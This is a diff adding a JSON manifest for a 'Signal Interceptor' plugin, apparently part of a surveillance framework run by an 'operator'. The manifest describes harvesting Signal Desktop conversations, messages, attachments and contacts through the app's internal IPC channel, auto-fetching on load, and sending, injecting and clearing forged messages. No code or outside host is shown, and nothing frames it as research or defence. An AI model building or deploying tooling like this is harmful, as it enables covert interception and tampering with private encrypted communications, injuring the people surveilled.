@@ -1,0 +1,68 @@
+{
+  "id": "signal",
+  "name": "Signal Interceptor",
+  "version": "1.0.0",
+  "description": "Intercepts conversations, messages, and attachments from Signal Desktop via its internal IPC database channel.",
+  "author": "operator",
+  "targetApps": ["signal", "Signal"],
+  "capabilities": {
+    "mainProcess": true,
+    "renderer": false,
+    "ui": true
+  },
+  "dataTypes": [
+    {
+      "name": "conversations",
+      "label": "Conversations",
+      "fields": ["conversations"]
+    },
+    {
+      "name": "messages",
+      "label": "Messages",
+      "fields": ["conversationId", "conversationName", "messages"]
+    },
+    {
+      "name": "send_result",
+      "label": "Send Results",
+      "fields": ["conversationId", "ok", "error"]
+    },
+    {
+      "name": "search_results",
+      "label": "Search Results",
+      "fields": ["query", "matches", "total"]
+    },
+    {
+      "name": "inject_result",
+      "label": "Inject Result",
+      "fields": ["conversationId", "success", "error"]
+    },
+    {
+      "name": "injected_messages",
+      "label": "Injected Messages",
+      "fields": ["messages", "count"]
+    },
+    {
+      "name": "clear_injected_result",
+      "label": "Clear Injected Result",
+      "fields": ["success", "cleared"]
+    },
+    {
+      "name": "attachment_data",
+      "label": "Attachment Data",
+      "fields": ["messageId", "fileName", "contentType", "data"]
+    },
+    {
+      "name": "contact_list",
+      "label": "Contacts",
+      "fields": ["contacts"]
+    }
+  ],
+  "settings": [
+    {
+      "key": "autoFetchConversations",
+      "label": "Auto-fetch conversations on load (1=yes, 0=no)",
+      "type": "number",
+      "default": 1
+    }
+  ]
+}
